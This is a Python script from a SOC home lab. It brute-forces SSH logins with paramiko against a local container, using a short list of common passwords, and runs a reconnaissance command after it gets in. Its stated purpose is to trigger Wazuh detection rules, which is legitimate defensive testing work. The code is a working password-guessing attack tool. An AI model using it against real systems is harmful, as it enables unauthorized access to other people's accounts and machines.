#!/usr/bin/env python3
"""
SOC Home Lab — Phase 1: SSH Brute Force Simulation
Triggers Wazuh rules: 100001 (brute force) and 100003 (success after brute force)

Run from your attacker machine (Windows host):
    python attacks/phase1_brute_force.py

Requirements: pip install paramiko
"""

import paramiko
import time
import sys

TARGET_HOST = "127.0.0.1"
TARGET_PORT = 2222

# Wordlist: wrong passwords first, then the real one at the end
ATTEMPTS = [
    ("labuser", "admin"),
    ("labuser", "123456"),
    ("labuser", "letmein"),
    ("labuser", "monkey"),
    ("labuser", "qwerty"),
    ("labuser", "abc123"),
    ("labuser", "password"),
    ("labuser", "iloveyou"),
    ("labuser", "sunshine"),
    ("labuser", "princess"),
    # The real credential — triggers rule 100003 (success after brute force)
    ("labuser", "password123"),
]

def attempt_ssh(host, port, username, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(host, port=port, username=username, password=password, timeout=5, banner_timeout=10)
        return True, client
    except paramiko.AuthenticationException:
        return False, None
    except Exception as e:
        print(f"  [!] Connection error: {e}")
        return False, None

def main():
    print("=" * 60)
    print("SOC Lab — Phase 1: SSH Brute Force")
    print(f"Target: {TARGET_HOST}:{TARGET_PORT}")
    print("Expected alerts: Rule 100001 (level 10), Rule 100003 (level 14 CRITICAL)")
    print("=" * 60)
    print()

    successful_client = None

    for i, (username, password) in enumerate(ATTEMPTS, 1):
        print(f"[{i:02d}/{len(ATTEMPTS)}] Trying {username}:{password} ... ", end="", flush=True)
        success, client = attempt_ssh(TARGET_HOST, TARGET_PORT, username, password)

        if success:
            print("SUCCESS!")
            successful_client = client
            break
        else:
            print("FAILED")
            time.sleep(0.3)  # small delay between attempts

    print()

    if successful_client:
        print("[+] Brute force succeeded. Now triggering post-login activity...")
        print("[+] Rule 100003 (CRITICAL: success after brute force) should fire now.")
        print()

        # Run a harmless command to show we have a shell
        stdin, stdout, stderr = successful_client.exec_command("id && hostname && uname -a")
        output = stdout.read().decode().strip()
        print("[+] Shell output:")
        for line in output.splitlines():
            print(f"    {line}")

        successful_client.close()
        print()
        print("[+] Phase 1 complete. Check Wazuh dashboard for alerts.")
        print("    Dashboard: https://localhost (accept self-signed cert)")
        print("    Navigate: Security Events > filter by rule.id: 100001 or 100003")
    else:
        print("[-] All attempts failed — check that the container is running.")
        sys.exit(1)

if __name__ == "__main__":
    main()
